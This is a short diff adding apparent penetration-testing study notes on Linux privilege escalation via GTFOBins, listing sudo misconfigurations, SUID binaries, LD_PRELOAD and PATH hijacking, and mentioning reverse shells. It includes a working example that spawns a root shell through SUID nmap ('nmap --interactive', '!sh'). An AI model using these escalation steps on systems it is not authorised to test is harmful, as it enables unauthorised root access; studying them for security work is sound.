@@ -1,0 +1,14 @@
+Exploit & Escalate (Ethically!)
+
+Use GTFOBins to exploit:
+sudo misconfigurations
+SUID binaries
+Environment variables (e.g., LD_PRELOAD, PATH hijack)
+Run shell upgrade or reverse shell
+bash
+# Example: Exploiting SUID nmap
+nmap --interactive
+!sh
+ Once you gain root, verify:
+whoami
+id
